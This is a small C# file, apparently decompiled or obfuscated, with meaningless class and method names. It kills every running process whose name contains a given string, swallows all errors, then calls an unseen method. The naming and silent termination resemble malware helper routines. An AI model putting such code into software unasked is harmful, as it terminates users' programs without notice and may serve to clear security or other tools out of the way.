using System;
using System.Diagnostics;

namespace azCTgkmpGT;

public sealed class iJZRQzzXetBzam
{
	public static bool oNinblHwkKrHTFu(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ofbKlIKaXi(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (oNinblHwkKrHTFu(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					ACJZwXMCdgNnIA.vAKYzPfahgkUEj();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
